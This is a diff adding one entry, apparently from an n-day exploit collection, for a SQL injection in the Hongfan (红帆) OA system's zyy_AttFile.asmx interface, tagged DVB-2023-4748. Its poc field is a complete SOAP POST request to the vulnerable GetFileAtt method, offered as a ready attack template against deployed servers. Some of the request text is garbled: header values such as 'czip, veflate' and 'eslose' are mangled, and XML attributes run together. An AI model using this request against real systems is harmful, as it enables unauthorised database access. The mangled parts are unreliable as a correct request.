@@ -1,0 +1,8 @@
+vendor = "红帆"
+name = "红帆oa zyy_attfileasmx sql注入"
+type = "SQL注入"
+source = "DVB、TG"
+info = "DVB-2023-4748"
+date = "08.08"
+poc = "POST /ioffice/prg/interface/zyy_AttFile.asmx HTTP/1.1 Host: ip User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 Content-Length: 383 Content-Type: text/xml; charset=utf-8 Soapaction: \"http://tempuri.org/GetFileAtt\" Accept-Encoding: czip, veflate Connection: eslose <?xml version=\"1.0\" encoding=\"utf-8\"?> <soap:Envelopexmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\"xmlns:soap=\"http://schemas.xmlsoap.org/soap/envelope/\"><soap:Body><GetFileAttxmlns=\"http://tempuri.org/\"><fileName>123</fileName></GetFileAtt> </soap:Body></soap:Envelope>"
+label = "nday"
